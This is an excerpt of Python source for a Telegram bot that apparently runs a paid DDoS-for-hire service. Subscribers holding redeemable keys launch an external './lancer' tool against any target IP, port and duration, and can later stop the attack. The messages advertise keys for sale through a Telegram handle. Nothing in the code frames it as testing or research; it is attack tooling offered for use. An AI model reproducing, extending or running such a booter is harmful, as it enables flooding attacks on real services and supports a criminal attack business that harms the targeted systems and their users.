...
from sandipan import BOT_TOKEN, ADMIN_IDS
...
def main_menu_keyboard():
    return ReplyKeyboardMarkup([ 
        ...
        [KeyboardButton("/genkey 300 hours")],
...
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    if user_id not in users:
        await update.message.reply_text("❌ You don't have an active subscription. Please contact the admin for assistance.Buy Form @HACK_CHIYE", reply_markup=main_menu_keyboard())
    else:
        expiration_date = users[user_id]
        await update.message.reply_text(f"👋 Welcome {username}!\n Your subscription is active until {expiration_date}.\n This Tool is provided by @HACK_CHIYE", reply_markup=main_menu_keyboard())
...
async def lancer(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    command = ['./lancer', target_ip, str(port), str(duration)]
    try:
        ...
        await update.message.reply_text(f"✅ Attack on {target_ip}:{port} has finished after {duration} seconds.")
...
async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    try:
        ...
        attack_details = user_processes[user_id]
        target_ip = attack_details["target_ip"]
        port = attack_details["port"]
        attack_id = attack_details["id"]
        ...
        await update.message.reply_text(f"✅ Attack ID: {attack_id} on {target_ip}:{port} has been stopped.", reply_markup=main_menu_keyboard())
    except Exception as e:
...
async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    if user_id in ADMIN_IDS:
        ...
        response = "ONLY OWNER CAN USE💀OWNER @Sandipan_1508."
...
async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    if len(command) == 1:
        ...
        if key in keys:
            ...
            response = "Invalid or expired key buy from @HACK_CHIYE."
    else:
